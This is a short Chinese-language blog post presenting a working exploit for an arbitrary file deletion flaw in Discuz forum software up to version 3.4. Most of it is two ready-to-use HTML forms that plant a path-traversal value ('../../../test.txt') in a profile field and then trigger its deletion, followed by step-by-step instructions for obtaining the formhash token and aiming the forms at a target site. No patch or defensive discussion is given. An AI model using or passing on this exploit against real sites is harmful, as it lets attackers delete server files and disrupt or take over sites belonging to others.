---
title: "discuz 任意文件删除"
date: 2018-03-19T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['cms']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

漏洞影响范围 discuz <= 3.4

<!--more-->

**exp**

```
<form action="http://www.xxx.com/home.php?mod=spacecp&ac=profile&op=base" method="POST" enctype="multipart/form-data">
<input type="text"name="birthprovince" id="text" value="../../../test.txt" />
<input type="text"name="formhash" value="de746a38"/></p>
<input type="text"name="profilesubmit" value="1"/></p>
<input type="submit"value="Submit" />
</form>

<br />

<form action="http://www.xxx.com/home.php?mod=spacecp&ac=profile&op=base&deletefile[birthprovince]=aaaaaa" method="POST" enctype="multipart/form-data">
<input type="file"name="birthprovince" id="file" />
<input type="text"name="formhash" value="de746a38"/></p>
<input type="text"name="profilesubmit" value="1"/></p>
<input type="submit"value="Submit" />
</form>
```

首先在前台注册账号

个人中心 修改个人资料

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03/19/1521461557.jpg)

右键查看 formhash

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03/19/1521461560.jpg)

修改 exp 中的网址

填上要删除的文件 formhash 选择文件

两个 submit 分别提交

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03/19/1521461562.jpg)